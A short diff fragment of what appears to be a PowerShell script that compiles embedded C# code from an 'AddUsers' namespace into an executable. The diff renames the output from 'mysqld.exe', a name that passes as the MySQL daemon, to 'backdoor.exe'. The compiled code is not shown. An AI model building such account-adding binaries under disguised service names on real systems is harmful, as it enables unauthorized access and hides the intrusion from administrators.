@@ -17,4 +17,4 @@ namespace AddUsers
     }
 }
 "@
-Add-Type -outputtype consoleapplication -outputassembly mysqld.exe -TypeDefinition $code -Language CSharp
+Add-Type -outputtype consoleapplication -outputassembly backdoor.exe -TypeDefinition $code -Language CSharp
